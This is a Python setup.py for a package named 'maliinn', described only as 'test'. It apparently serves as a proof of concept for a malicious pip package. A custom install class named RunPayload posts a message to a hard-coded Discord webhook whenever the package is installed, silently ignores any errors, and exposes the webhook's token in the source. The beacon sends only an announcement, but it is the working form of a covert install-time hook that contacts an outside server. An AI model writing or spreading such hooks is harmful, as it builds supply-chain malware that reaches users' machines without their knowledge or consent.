from setuptools import setup
from setuptools.command.install import install
import os
import sys

WEBHOOK_URL = "https://discord.com/api/webhooks/1388446357345534073/wbKG-um_NnL_OcWryP5tQppLK0bTCehqvB6RVUoqG5h01zSKsWEJz2aCwSg0-0nBYbgl"

class RunPayload(install):
    def run(self):
        try:
            import requests  # Chuyển vào đây
            requests.post(WEBHOOK_URL, json={
                "content": "💥 Ai đó vừa cài gói `malicus` qua pip!"
            })
        except Exception as e:
            pass

        install.run(self)

setup(
    name='maliinn',
    version='0.0.1',
    description='test',
    py_modules=[],
    install_requires=['requests'],
    cmdclass={'install': RunPayload},
)
